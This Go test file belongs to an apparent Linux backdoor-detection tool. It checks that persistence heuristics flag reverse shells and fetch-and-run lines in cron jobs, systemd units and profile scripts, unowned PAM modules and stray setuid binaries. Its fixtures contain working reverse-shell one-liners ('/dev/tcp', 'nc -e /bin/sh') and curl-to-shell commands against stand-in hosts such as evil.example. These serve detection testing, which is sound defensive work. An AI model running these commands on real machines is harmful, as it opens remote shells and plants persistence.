package heuristics

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/donaldsteele/telltale/internal/model"
	"github.com/donaldsteele/telltale/internal/persistsig"
	"github.com/donaldsteele/telltale/internal/redact"
)

func persistFile(path, kind string, lines ...string) model.PersistFile {
	// Signals come from the raw lines, as the collector computes them.
	return model.PersistFile{Path: path, Kind: kind, Mode: 0o100644, Lines: lines, Signals: persistsig.Detect(kind, lines)}
}

func callbackFindings(t *testing.T, pf model.PersistFile) []model.Finding {
	t.Helper()
	c := cleanCollection()
	c.Persist = append(c.Persist, pf)
	var out []model.Finding
	for _, f := range Run(c, ctx, cleanOwned()) {
		if strings.HasPrefix(f.Key, "heur.persist_callback:") {
			out = append(out, f)
		}
	}
	return out
}

func TestPersistCallbackFileLevel(t *testing.T) {
	// comments, wrong kinds and symlinks never hit
	for _, pf := range []model.PersistFile{
		persistFile("/etc/cron.d/x", model.PersistKindCron, "# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
		persistFile("/etc/profile.d/x.sh", model.PersistKindProfile, "  # nc -e /bin/sh h 1"),
		persistFile("/etc/systemd/system/x.service", model.PersistKindSystemdUnit, "; ExecStart=/bin/bash -i >& /dev/tcp/h/1 0>&1", "Description=bash -i >& /dev/tcp/h/1"),
		persistFile("/etc/systemd/system/y.service", model.PersistKindSystemdUnit, "ExecStart=/usr/bin/socat TCP-LISTEN:8080,fork TCP:localhost:80"),
		persistFile("/etc/hosts", model.PersistKindHosts, "bash -i >& /dev/tcp/10.0.0.1/4444"),
		persistFile("/etc/sudoers", model.PersistKindSudoers, "nc -e /bin/sh h 1"),
	} {
		if fs := callbackFindings(t, pf); len(fs) != 0 {
			t.Errorf("%s: unexpected %v", pf.Path, keys(fs))
		}
	}
	link := persistFile("/etc/cron.d/l", model.PersistKindCron, "curl x | sh")
	link.Mode = 0o120777
	if fs := callbackFindings(t, link); len(fs) != 0 {
		t.Errorf("symlink flagged: %v", keys(fs))
	}

	// one finding per file: first line is the evidence, the rest are counted
	pf := persistFile("/etc/cron.d/lab-update", model.PersistKindCron,
		"SHELL=/bin/sh",
		"* * * * * root /bin/bash -c 'exec 3<>/dev/tcp/sink/4444 && echo hi >&3'",
		"* * * * * root curl -s http://x/a | sh",
		"* * * * * root /usr/bin/true")
	fs := callbackFindings(t, pf)
	if len(fs) != 1 {
		t.Fatalf("got %v", keys(fs))
	}
	f := fs[0]
	if f.Key != "heur.persist_callback:/etc/cron.d/lab-update" || f.ID != "TT-HEUR-015" || f.Severity != model.SevBackdoor {
		t.Errorf("finding: %+v", f)
	}
	if f.Evidence[0].Path != pf.Path || f.Evidence[0].Line != 2 || !strings.Contains(f.Evidence[0].After, "/dev/tcp/sink/4444") {
		t.Errorf("evidence: %+v", f.Evidence[0])
	}
	if !strings.Contains(evidenceText(f), "1 more") {
		t.Errorf("other matches not counted: %+v", f)
	}
	// the fix saves the file first and quotes the path
	if !strings.Contains(f.Fix, "cp -a --parents '/etc/cron.d/lab-update'") || !strings.Contains(f.Fix, "sed -i '2s/^/#/' '/etc/cron.d/lab-update'") {
		t.Errorf("fix: %s", f.Fix)
	}
	// a file name with a newline gets no command
	bad := persistFile("/etc/cron.d/a\nb", model.PersistKindCron, "nc -e /bin/sh h 1")
	if fs := callbackFindings(t, bad); len(fs) != 1 || strings.Contains(fs[0].Fix, "sed") {
		t.Errorf("control char path: %+v", fs)
	}
	// systemd: only Exec lines count, the fix disables the unit, notes go last
	u := persistFile("/etc/systemd/system/lab-sync.service", model.PersistKindSystemdUnit,
		"[Service]", "ExecStartPre=-/bin/true", "ExecStart=/bin/bash -c 'exec 3<>/dev/tcp/sink/4444 && echo lab-callback >&3'")
	fs = callbackFindings(t, u)
	if len(fs) != 1 || !strings.Contains(fs[0].Fix, "systemctl disable --now 'lab-sync.service'") || fs[0].Evidence[0].Line != 3 {
		t.Fatalf("unit: %+v", fs)
	}
	if strings.Index(fs[0].Fix, "#") < strings.LastIndex(fs[0].Fix, "&&") {
		t.Errorf("note before command: %s", fs[0].Fix)
	}
}

func evidenceText(f model.Finding) string {
	var b strings.Builder
	for _, e := range f.Evidence {
		b.WriteString(e.Detail + " " + e.After + " ")
	}
	return b.String() + f.Title + f.Why
}

func TestPersistCallbackContinuationLines(t *testing.T) {
	// the pattern is split across physical lines
	pf := persistFile("/etc/cron.d/split", model.PersistKindCron,
		"* * * * * root curl -s http://x.example/a \\",
		"   | sh")
	fs := callbackFindings(t, pf)
	if len(fs) != 1 || fs[0].Evidence[0].Line != 1 || !strings.Contains(fs[0].Evidence[0].After, "| sh") {
		t.Fatalf("got %+v", fs)
	}
	if !strings.Contains(fs[0].Fix, "sed -i '1,2s/^/#/'") {
		t.Errorf("fix must comment the whole logical line: %s", fs[0].Fix)
	}
	u := persistFile("/etc/systemd/system/s.service", model.PersistKindSystemdUnit,
		"ExecStart=/bin/bash -c 'exec 3<>\\", "/dev/tcp/h/1'")
	if fs := callbackFindings(t, u); len(fs) != 1 {
		t.Errorf("unit continuation: %v", keys(fs))
	}
	// a comment ending in a backslash does not swallow the next line
	cm := persistFile("/etc/profile.d/c.sh", model.PersistKindProfile, "# note \\", "echo | sh")
	if fs := callbackFindings(t, cm); len(fs) != 0 {
		t.Errorf("comment continuation: %v", keys(fs))
	}
}

// TestPersistCallbackLabBreaks feeds the lines the lab breaks plant, read
// from their apply.sh, through the matcher.
func TestPersistCallbackLabBreaks(t *testing.T) {
	root := filepath.Join("..", "..", "lab", "breaks")
	cases := []struct{ dir, path, kind, needle string }{
		{"cron-callback", "/etc/cron.d/lab-update", model.PersistKindCron, "/dev/tcp/sink/4444"},
		{"systemd-callback", "/etc/systemd/system/lab-sync.service", model.PersistKindSystemdUnit, "ExecStart="},
		{"profile-script", "/etc/profile.d/lab-motd.sh", model.PersistKindProfile, "/dev/tcp/sink/4444"},
	}
	for _, tc := range cases {
		b, err := os.ReadFile(filepath.Join(root, tc.dir, "apply.sh"))
		if err != nil {
			t.Fatal(err)
		}
		var planted []string
		for _, l := range strings.Split(string(b), "\n") {
			if !strings.Contains(l, tc.needle) {
				continue
			}
			// echo "<line>" > file   ->   <line>
			if strings.HasPrefix(l, "echo \"") {
				l = strings.TrimPrefix(l, "echo \"")
				l = l[:strings.LastIndex(l, "\"")]
			}
			planted = append(planted, l)
		}
		if len(planted) == 0 {
			t.Fatalf("%s: no planted line found", tc.dir)
		}
		fs := callbackFindings(t, persistFile(tc.path, tc.kind, planted...))
		if len(fs) != 1 || fs[0].Key != "heur.persist_callback:"+tc.path || fs[0].Severity != model.SevBackdoor {
			t.Errorf("%s: %v (planted %q)", tc.dir, keys(fs), planted)
		}
	}
}

func pamFile(lines ...string) model.PersistFile {
	return model.PersistFile{Path: "/etc/pam.d/common-auth", Kind: model.PersistKindPAM, Mode: 0o100644, Lines: lines}
}

func TestPAMUnownedModule(t *testing.T) {
	c := cleanCollection()
	c.Files = append(c.Files,
		model.FileEntry{Path: "/usr/lib/x86_64-linux-gnu/security/pam_unix.so", Type: "file"},
		model.FileEntry{Path: "/usr/lib/x86_64-linux-gnu/security/pam_lab.so", Type: "file"},
		model.FileEntry{Path: "/usr/lib/security/pam_old.so", Type: "file"},
		model.FileEntry{Path: "/opt/pam/pam_abs.so", Type: "file"},
		model.FileEntry{Path: "/opt/pam/pam_owned.so", Type: "file"})
	owned := cleanOwned()
	owned["/usr/lib/x86_64-linux-gnu/security/pam_unix.so"] = "libpam-modules"
	owned["/opt/pam/pam_owned.so"] = "vendor"
	c.Persist = append(c.Persist, pamFile(
		"# comment",
		"@include common-account",
		"auth include runuser",
		"session substack common-session",
		"auth [success=1 default=ignore] pam_unix.so nullok",
		"auth optional pam_lab.so",
		"auth optional /opt/pam/pam_abs.so debug",
		"auth optional /opt/pam/pam_owned.so",
		"session required pam_old.so",
		"auth optional pam_gone.so",
		"-session optional pam_quiet.so",
		"account required /usr/lib/x86_64-linux-gnu/security/pam_lab.so", // same module again
	))
	fs := Run(c, ctx, owned)
	for _, k := range []string{
		"heur.pam_unowned:/usr/lib/x86_64-linux-gnu/security/pam_lab.so",
		"heur.pam_unowned:/opt/pam/pam_abs.so",
		"heur.pam_unowned:/usr/lib/security/pam_old.so",
	} {
		f := find(fs, k)
		if f == nil {
			t.Errorf("missing %s; got %v", k, keys(fs))
			continue
		}
		if f.Severity != model.SevBackdoor || f.ID != "TT-HEUR-016" || f.Evidence[0].Path != "/etc/pam.d/common-auth" || f.Evidence[0].Line == 0 || f.Evidence[0].After == "" {
			t.Errorf("%s: %+v", k, f)
		}
	}
	lab := find(fs, "heur.pam_unowned:/usr/lib/x86_64-linux-gnu/security/pam_lab.so")
	if lab != nil && (lab.Evidence[0].Line != 6 || len(lab.Evidence) < 2) {
		t.Errorf("first line is the evidence and the second use is listed: %+v", lab.Evidence)
	}
	if lab != nil && (!strings.Contains(lab.Fix, "sed -i '6s/^/#/' '/etc/pam.d/common-auth'") || !strings.Contains(lab.Fix, "cp -a --parents")) {
		t.Errorf("fix: %s", lab.Fix)
	}
	if find(fs, "heur.pam_unowned:/usr/lib/x86_64-linux-gnu/security/pam_unix.so") != nil || find(fs, "heur.pam_unowned:/opt/pam/pam_owned.so") != nil {
		t.Errorf("owned module flagged: %v", keys(fs))
	}
	m := find(fs, "heur.pam_missing:pam_gone.so")
	if m == nil || m.Severity != model.SevNote || m.ID != "TT-HEUR-016" {
		t.Errorf("missing module: %v", keys(fs))
	}
	if find(fs, "heur.pam_missing:pam_quiet.so") != nil {
		t.Error("a -line is silent about a missing module")
	}
	// merged /usr: a /lib spelling of an owned module is owned and present
	c2 := cleanCollection()
	c2.Files = append(c2.Files, model.FileEntry{Path: "/usr/lib/security/pam_x.so", Type: "file"})
	c2.Persist = append(c2.Persist, pamFile("auth required /lib/security/pam_x.so"))
	for _, f := range Run(c2, ctx, map[string]string{"/usr/lib/security/pam_x.so": "p"}) {
		if strings.HasPrefix(f.Key, "heur.pam_") {
			t.Errorf("alias: %v", f.Key)
		}
	}
}

func TestUnownedCapabilityFile(t *testing.T) {
	c := cleanCollection()
	c.Files = append(c.Files,
		model.FileEntry{Path: "/var/tmp/.c", Type: "file", Mode: 0o100755, Caps: "0100000200000000"},
		model.FileEntry{Path: "/usr/local/bin/ping2", Type: "file", Mode: 0o100755, Caps: "01"},
		model.FileEntry{Path: "/usr/bin/sudo2", Type: "file", Mode: 0o100755, Caps: "01"})
	owned := cleanOwned()
	owned["/usr/bin/sudo2"] = "sudo"
	fs := Run(c, ctx, owned)
	if f := find(fs, "heur.unowned_caps:/var/tmp/.c"); f == nil || f.Severity != model.SevBackdoor || !strings.Contains(f.Fix, "setcap -r '/var/tmp/.c'") {
		t.Errorf("caps: %v", keys(fs))
	}
	if f := find(fs, "heur.unowned_caps:/usr/local/bin/ping2"); f == nil || f.Severity != model.SevNote {
		t.Errorf("local caps: %v", keys(fs))
	}
	if find(fs, "heur.unowned_caps:/usr/bin/sudo2") != nil {
		t.Error("owned file flagged")
	}
	// ranking of the setuid rule: /var/tmp/.s is a backdoor sign, /usr/local a note
	c.Files = append(c.Files,
		model.FileEntry{Path: "/var/tmp/.s", Type: "file", Mode: 0o104755},
		model.FileEntry{Path: "/usr/local/sbin/helper", Type: "file", Mode: 0o104755})
	want(t, c, "heur.unowned_setuid:/var/tmp/.s", model.SevBackdoor)
	want(t, c, "heur.unowned_setuid:/usr/local/sbin/helper", model.SevNote)
}

// redactedFile builds a persistence file the way the collector does: signals
// from the raw lines, kept lines redacted.
func redactedFile(path, kind string, raw ...string) model.PersistFile {
	key := []byte("0123456789abcdef0123456789abcdef")
	pf := model.PersistFile{Path: path, Kind: kind, Mode: 0o100644, Signals: persistsig.Detect(kind, raw)}
	for _, l := range raw {
		r, n := redact.Line(key, l)
		pf.Lines = append(pf.Lines, r)
		pf.Redactions += n
	}
	return pf
}

func TestPersistCallbackRedactedLineStillHits(t *testing.T) {
	// A query string or a secret-like key swallows the rest of the line in
	// the kept text; the signal was taken from the raw text.
	for _, raw := range []string{
		`* * * * * root curl -s http://evil.example/a?a=1&token=abc123 | sh`,
		`* * * * * root curl -s 'http://evil.example/a?key=abc123' | bash`,
		`* * * * * root SECRET=hunter2 /bin/bash -c 'exec 3<>/dev/tcp/h/4444'`,
	} {
		pf := redactedFile("/etc/cron.d/q", model.PersistKindCron, "SHELL=/bin/sh", raw)
		if pf.Redactions == 0 || strings.Contains(pf.Lines[1], "| sh") && strings.Contains(raw, "token=") {
			t.Fatalf("test setup: line not redacted as expected: %q", pf.Lines[1])
		}
		fs := callbackFindings(t, pf)
		if len(fs) != 1 || fs[0].Evidence[0].Line != 2 || !strings.Contains(fs[0].Evidence[0].After, "<redacted") || strings.Contains(fs[0].Evidence[0].After, "abc123") {
			t.Errorf("%s: %+v", raw, fs)
		}
	}
	// Environment= values are redacted and never executed: no callback
	u := redactedFile("/etc/systemd/system/f.service", model.PersistKindSystemdUnit,
		`Environment="API_TOKEN=abc123456789" MODE=prod`, "ExecStart=/usr/bin/true")
	if fs := callbackFindings(t, u); len(fs) != 0 {
		t.Errorf("Environment line flagged: %v", keys(fs))
	}
}

func TestPersistCallbackAcceptDoesNotCoverLaterLines(t *testing.T) {
	// accept stores key plus Evidence[0].After; a callback added later must
	// change that text
	one := persistFile("/etc/crontab", model.PersistKindCron, "0 * * * * root curl -s http://mine.example/a | sh")
	two := persistFile("/etc/crontab", model.PersistKindCron, "0 * * * * root curl -s http://mine.example/a | sh",
		"* * * * * root bash -c 'exec 3<>/dev/tcp/evil/4444'")
	a, b := callbackFindings(t, one), callbackFindings(t, two)
	if len(a) != 1 || len(b) != 1 || a[0].Key != b[0].Key {
		t.Fatalf("setup: %v %v", a, b)
	}
	if a[0].Evidence[0].After == b[0].Evidence[0].After || !strings.Contains(b[0].Evidence[0].After, "/dev/tcp/evil") || !strings.Contains(b[0].Evidence[0].After, "mine.example") {
		t.Errorf("after one: %q two: %q", a[0].Evidence[0].After, b[0].Evidence[0].After)
	}
}

func TestSetuidPackagedCopy(t *testing.T) {
	c := cleanCollection()
	c.Files = append(c.Files,
		model.FileEntry{Path: "/usr/bin/su", Type: "file", Mode: 0o104755, SHA256: "aa"},
		model.FileEntry{Path: "/var/tmp/su.bak", Type: "file", Mode: 0o104755, SHA256: "aa"},
		model.FileEntry{Path: "/var/tmp/su.edited", Type: "file", Mode: 0o104755, SHA256: "bb"},
		model.FileEntry{Path: "/var/tmp/.s", Type: "file", Mode: 0o104755, SHA256: "cc"}, // bash copy: bash is not setuid
		model.FileEntry{Path: "/usr/bin/bash", Type: "file", Mode: 0o100755, SHA256: "cc"},
		model.FileEntry{Path: "/var/tmp/su.nosuid", Type: "file", Mode: 0o102755, SHA256: "aa"}) // setgid copy of a setuid original: different bits
	owned := cleanOwned()
	owned["/usr/bin/su"] = "util-linux"
	owned["/usr/bin/bash"] = "bash"
	fs := Run(c, ctx, owned)
	if f := find(fs, "heur.setuid_packaged_copy:/var/tmp/su.bak"); f == nil || f.Severity != model.SevNote {
		t.Errorf("copy: %v", keys(fs))
	}
	if find(fs, "heur.unowned_setuid:/var/tmp/su.bak") != nil {
		t.Error("copy also reported as unowned")
	}
	for _, p := range []string{"/var/tmp/su.edited", "/var/tmp/.s", "/var/tmp/su.nosuid"} {
		if f := find(fs, "heur.unowned_setuid:"+p); f == nil || f.Severity != model.SevBackdoor {
			t.Errorf("%s: %v", p, keys(fs))
		}
	}
}

func TestPAMDotDotModuleName(t *testing.T) {
	c := &model.Collection{}
	c.Files = []model.FileEntry{
		{Path: "/usr/lib/x86_64-linux-gnu/security/pam_unix.so", Type: "file", Mode: 0o100644},
		{Path: "/usr/bin/login", Type: "file", Mode: 0o100755},
		{Path: "/usr/lib/bin/login", Type: "file", Mode: 0o100644}, // planted, unowned
	}
	owned := map[string]string{
		"/usr/lib/x86_64-linux-gnu/security/pam_unix.so": "libpam-modules", "/lib/x86_64-linux-gnu/security/pam_unix.so": "libpam-modules",
		"/usr/bin/login": "login", "/bin/login": "login",
	}
	c.Persist = []model.PersistFile{{Path: "/etc/pam.d/sshd", Kind: model.PersistKindPAM, Mode: 0o100644, Lines: []string{
		"auth sufficient ../../bin/login",
		"auth required pam_unix.so",
	}}}
	fs := Run(c, ctx, owned)
	if f := find(fs, "heur.pam_path_escape:../../bin/login"); f == nil || f.Severity != model.SevBackdoor || f.ID != "TT-HEUR-016" {
		t.Errorf("no path escape finding: %v", keys(fs))
	}
	if f := find(fs, "heur.pam_unowned:/usr/lib/bin/login"); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("the planted candidate is not reported: %v", keys(fs))
	}
	if find(fs, "heur.pam_unowned:/usr/bin/login") != nil || find(fs, "heur.pam_unowned:/usr/lib/x86_64-linux-gnu/security/pam_unix.so") != nil {
		t.Errorf("owned module flagged: %v", keys(fs))
	}
}

func TestSetuidPackagedCopyKeyIncludesModeAndOwner(t *testing.T) {
	c := &model.Collection{Files: []model.FileEntry{
		{Path: "/usr/lib/dbus-1.0/dbus-daemon-launch-helper", Type: "file", Mode: 0o104754, GID: 101, SHA256: "dbus"},
		{Path: "/var/tmp/.d", Type: "file", Mode: 0o104755, GID: 0, SHA256: "dbus"},
		{Path: "/usr/bin/at", Type: "file", Mode: 0o106755, UID: 1, GID: 1, SHA256: "at"},
		{Path: "/var/tmp/.a", Type: "file", Mode: 0o106755, UID: 0, GID: 0, SHA256: "at"},
		{Path: "/usr/bin/su", Type: "file", Mode: 0o104755, SHA256: "su"},
		{Path: "/var/tmp/su.copy", Type: "file", Mode: 0o104755, SHA256: "su"},
		// a shell: offline mode cannot confirm the reference's bits are original
		{Path: "/usr/bin/bash", Type: "file", Mode: 0o104755, SHA256: "bash"},
		{Path: "/var/tmp/.s", Type: "file", Mode: 0o104755, SHA256: "bash"},
		{Path: "/usr/bin/python3.12", Type: "file", Mode: 0o104755, SHA256: "py"},
		{Path: "/var/tmp/.p", Type: "file", Mode: 0o104755, SHA256: "py"},
	}}
	owned := map[string]string{"/usr/lib/dbus-1.0/dbus-daemon-launch-helper": "dbus-daemon", "/usr/bin/at": "at", "/usr/bin/su": "util-linux", "/usr/bin/bash": "bash", "/usr/bin/python3.12": "python3.12"}
	fs := Run(c, ctx, owned)
	for _, p := range []string{"/var/tmp/.d", "/var/tmp/.a", "/var/tmp/.s", "/var/tmp/.p"} {
		if f := find(fs, "heur.unowned_setuid:"+p); f == nil || f.Severity != model.SevBackdoor {
			t.Errorf("%s should stay a backdoor sign: %v", p, keys(fs))
		}
	}
	if find(fs, "heur.setuid_packaged_copy:/var/tmp/su.copy") == nil {
		t.Errorf("a true copy lost its note: %v", keys(fs))
	}
}

// The PAM module directory is a link now (root moved it away). A module the
// configuration loads is the file behind the link: one no package owns there
// is unowned, not "missing", and an owned one is neither.
func TestPAMModuleBehindAMovedDirectory(t *testing.T) {
	const sec = "/usr/lib/x86_64-linux-gnu/security"
	c := cleanCollection()
	c.Files = append(c.Files,
		model.FileEntry{Path: "/usr", Type: "dir"}, model.FileEntry{Path: "/usr/lib", Type: "dir"}, model.FileEntry{Path: "/usr/lib/x86_64-linux-gnu", Type: "dir"},
		model.FileEntry{Path: sec, Type: "symlink", Target: "/srv/pam"},
		model.FileEntry{Path: "/srv", Type: "dir"}, model.FileEntry{Path: "/srv/pam", Type: "dir"},
		model.FileEntry{Path: "/srv/pam/pam_unix.so", Type: "file"},
		model.FileEntry{Path: "/srv/pam/pam_deny.so", Type: "file"})
	owned := cleanOwned()
	owned["/srv/pam/pam_deny.so"] = "libpam-modules" // the ownership index is keyed by where a file really is too
	c.Persist = append(c.Persist, pamFile("auth [success=1 default=ignore] pam_unix.so nullok", "auth requisite pam_deny.so"))
	fs := Run(c, ctx, owned)
	if f := find(fs, "heur.pam_unowned:/srv/pam/pam_unix.so"); f == nil || f.Severity != model.SevBackdoor {
		t.Errorf("the module behind the moved directory that no package owns: %v", keys(fs))
	}
	for _, k := range []string{"heur.pam_missing:pam_unix.so", "heur.pam_missing:pam_deny.so", "heur.pam_unowned:/srv/pam/pam_deny.so"} {
		if find(fs, k) != nil {
			t.Errorf("unexpected %s", k)
		}
	}
}
